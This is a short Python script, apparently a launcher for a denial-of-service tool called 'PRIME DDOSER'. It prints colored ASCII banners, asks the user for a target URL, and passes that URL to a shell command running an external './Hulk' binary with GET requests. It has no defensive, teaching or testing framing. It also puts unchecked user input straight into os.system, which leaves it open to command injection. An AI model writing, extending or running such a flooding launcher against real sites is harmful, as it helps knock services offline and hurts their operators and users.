import os
import time
import pyfiglet
from colorama import Fore, Style, init

os.system('clear')

init(autoreset=True)

def big_text(text, color):
    """Display big ASCII text in chosen color."""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format(text, font="slant")
    print(color + banner + Style.RESET_ALL)

def intro_animation():
    
    big_text("PRIME", Fore.RED)
    time.sleep(1)

    big_text("DDOSER", Fore.GREEN)
    time.sleep(2)
   
    os.system('cls' if os.name == 'nt' else 'clear')
  
intro_animation()

big_text("PRIME", Fore.RED)

print(Fore.RED + "WELCOME TO PRIME DDOSER — V3")

target = input(Fore.RED + "TARGET URL —> ")

if not target:
         print("Target Url Can't be Empty")
else:
     os.system(f'./Hulk PRIME {target} GET')